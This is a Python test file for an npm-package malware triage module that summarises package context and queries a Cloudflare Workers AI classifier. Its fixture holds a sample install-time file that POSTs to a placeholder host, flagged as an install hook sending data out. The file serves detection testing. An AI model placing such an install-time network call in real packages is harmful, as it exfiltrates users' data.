from secopsai import clef_triage


class _Response:
    def __init__(self, payload):
        self.payload = payload

    def raise_for_status(self):
        pass

    def json(self):
        return self.payload


class _Session:
    def __init__(self, payload):
        self.payload, self.sent = payload, None

    def post(self, url, **kwargs):
        self.sent = {"url": url, **kwargs}
        return _Response(self.payload)


CONTEXT = {"ecosystem": "npm", "package": "x", "version": "1.0.0", "rule_score": 80, "rule_level": "alert",
           "metadata_signals": [{"id": "behaviours", "flags": ["install_hook", "http_send"]}],
           "install_time_files": [{"path": "package/i.js", "content": "fetch('https://e.example/c',{method:'POST'})"}],
           "findings": [{"rule_id": "BEHAVIOUR:BEH_X", "file_path": "package/i.js", "matched_indicator": "behaviour: http_send", "safe_context": "fetch(...)"}]}


def test_state_puts_install_files_first_and_is_capped():
    state = clef_triage.build_state(CONTEXT)
    assert state.index("install-time file package/i.js") < state.index("finding BEHAVIOUR:BEH_X")
    assert "Behaviour flags: install_hook, http_send" in state
    assert len(clef_triage.build_state({**CONTEXT, "install_time_files": [{"path": "a", "content": "z" * 100000}]})) == clef_triage.MAX_STATE_CHARS


def test_classify_reads_workers_ai_answers():
    payload = {"success": True, "result": {"model": "clef", "usage": {"input_tokens": 812, "output_tokens": 0}, "answers": {
        "malicious": {"type": "noul", "noul": 0.87},
        "disposition": {"type": "choice", "choice": "malicious", "probabilities": {"malicious": 0.8, "benign": 0.05, "needs_review": 0.15}, "confidence": 0.7}}}}
    session = _Session(payload)
    result = clef_triage.classify(CONTEXT, account_id="acct", api_token="tok", session=session)
    assert result == {"probability": 87, "choice": "malicious", "choice_probabilities": {"malicious": 0.8, "benign": 0.05, "needs_review": 0.15},
                      "input_tokens": 812, "model": "clef"}
    assert session.sent["url"].endswith("/accounts/acct/ai/run/@cf/cloudflare/clef")
    assert set(session.sent["json"]["questions"]) == {"malicious", "disposition"}
